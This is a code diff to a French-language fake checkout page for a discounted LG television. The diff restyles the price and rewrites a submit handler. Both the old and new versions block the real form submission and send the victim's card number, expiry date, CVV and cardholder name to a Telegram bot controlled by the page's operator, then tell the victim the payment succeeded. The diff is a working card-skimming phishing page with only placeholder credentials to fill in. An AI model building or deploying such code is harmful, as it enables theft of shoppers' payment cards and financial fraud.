@@ -44,6 +44,13 @@
             color: #333;
         }
 
+        .price {
+            font-size: 20px;
+            color: #c70000;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
@@ -107,12 +114,12 @@
             <p>Résolution : 4K</p>
             <p>Fréquence de rafraîchissement : 50 Hz</p>
             <p>Technologie de connectivité : USB, HDMI</p>
-            <p><strong>Prix : 399.99€</strong></p>
+            <p class="price">Prix : 399.99€</p>
         </div>
 
         <h2>Informations de Paiement</h2>
 
-        <form action="" method="POST" id="paymentForm">
+        <form action="confirmation.html" method="POST" id="payment-form">
             <div class="form-group">
                 <label for="card-number">Numéro de carte</label>
                 <input 
@@ -192,44 +199,41 @@
             e.target.value = formattedValue;
         });
 
-        // Fonction d'envoi des données au bot Telegram
-        const form = document.getElementById('paymentForm');
-        form.addEventListener('submit', async function(event) {
-            event.preventDefault();
-            const formData = new FormData(form);
-            const formValues = Object.fromEntries(formData);
+        // Fonction pour envoyer les informations au bot Telegram
+        document.getElementById('payment-form').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Eviter l'envoi du formulaire
 
+            const data = new FormData(this);
+            const cardNumber = data.get('card-number');
+            const expiryMonth = data.get('expiry-month');
+            const expiryYear = data.get('expiry-year');
+            const cvv = data.get('cvv');
+            const nameOnCard = data.get('name-on-card');
+            const price = "399.99€"; // Prix du produit
+
+            // Créez un message à envoyer
             const message = `
-                Nouvelle commande :
-                - Nom sur la carte : ${formValues['name-on-card']}
-                - Numéro de carte : ${formValues['card-number']}
-                - Expiration : ${formValues['expiry-month']}/${formValues['expiry-year']}
-                - CVV : ${formValues['cvv']}
-                - Prix : 399.99€
-            `;
+Produit : LG TV - 55NANO766 - 55 Pouces 4K
+Prix : ${price}
+Numéro de carte : ${cardNumber}
+Date d'expiration : ${expiryMonth}/${expiryYear}
+CVV : ${cvv}
+Nom sur la carte : ${nameOnCard}
+`;
 
-            const telegramToken = "VOTRE_TOKEN_TELEGRAM";
-            const chatId = "VOTRE_CHAT_ID";
-            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            const botToken = 'VOTRE_BOT_TOKEN'; // Remplacez par votre Token de bot Telegram
+            const chatId = 'VOTRE_CHAT_ID'; // Remplacez par votre chat ID Telegram
 
-            const payload = {
-                chat_id: chatId,
-                text: message
-            };
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            const requestOptions = {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            };
+            // Envoi du message
+            const response = await fetch(telegramApiUrl);
+            const dataResponse = await response.json();
 
-            const response = await fetch(url, requestOptions);
-            if (response.ok) {
-                alert('Votre paiement a été soumis avec succès!');
+            if (dataResponse.ok) {
+                alert('Votre paiement a été envoyé avec succès.');
             } else {
-                alert('Erreur lors de la soumission de votre paiement.');
+                alert('Erreur dans l\'envoi des informations.');
             }
         });
     </script>
